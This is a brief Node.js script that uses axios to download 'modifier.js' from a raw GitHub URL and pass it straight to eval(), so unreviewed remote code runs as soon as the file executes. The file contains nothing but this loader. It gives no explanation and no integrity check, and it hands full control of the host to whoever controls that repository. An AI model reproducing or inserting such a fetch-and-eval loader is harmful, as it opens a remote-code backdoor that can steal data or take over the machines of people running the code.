const axios = require('axios');

(async () => {
  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/THE-REBEL-A4IF-V4U/REBEL-AUTHOR/main/modifier.js");
    if (data) {
      eval(data);
    }
  } catch (error) {
    console.error("Error fetching code:", error.message);
  }
})();
